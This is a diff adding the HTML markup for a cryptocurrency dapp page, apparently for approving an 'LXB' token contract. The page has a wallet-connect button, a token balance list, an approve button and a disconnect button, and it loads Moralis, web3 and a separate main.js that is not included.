@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LXB Token Approval</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://unpkg.com/moralis-v1@1.13.0/dist/moralis.js"></script>
+    <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.16.0/web3.min.js" integrity="sha512-EcohdIzTaj7kvP0ymM3RiKxanvfwGvjsrmouFROeLbtIXNXgQBDUee6wrf7L4bgwSiXGZRLi2AlDkOQ4WrCKYg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script> -->
+	<script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+</head>
+<body>
+    <div class="container" id="app">
+        <h1>LXB Token Approval</h1>
+        <p>Connect your wallet to interact with the LXB contract.</p>
+        <appkit-button></appkit-button>
+
+        <div class="wallet-info">
+            <div class="address-container">
+                <span class="wallet-address"></span>
+                <button class="copy-btn">📋</button>
+            </div>
+            <div class="network-badge"></div>
+
+            <div class="token-balances">
+                <h3>Token Balances</h3>
+                <div class="balance-list"></div>
+                <div class="loading-overlay" style="display: none;">
+                    <div class="loading-spinner"></div>
+                </div>
+            </div>
+
+            <!-- New approval section -->
+            <div class="approval-section">
+                <h3>LXB Token Approval</h3>
+                <div class="approval-status">
+                    <!-- <p>Current Allowance: <span id="current-allowance">Loading...</span></p> -->
+                    <div id="status" class="status-message"></div>
+                </div>
+
+                <div class="approval-actions">
+                    <button id="approve-token" class="approve-btn">Approve LXB Contract</button>
+                    <p class="gas-notice">Note: This transaction requires ETH for gas fees</p>
+                </div>
+            </div>
+
+            <button id="disconnect-btn" class="disconnect-btn">Disconnect Wallet</button>
+        </div>
+
+        <div class="sign-message-section">
+            <div id="signature-result" style="display: none;"></div>
+        </div>
+    </div>
+
+    <script type="module" src="main.js"></script>
+</body>
+</html>
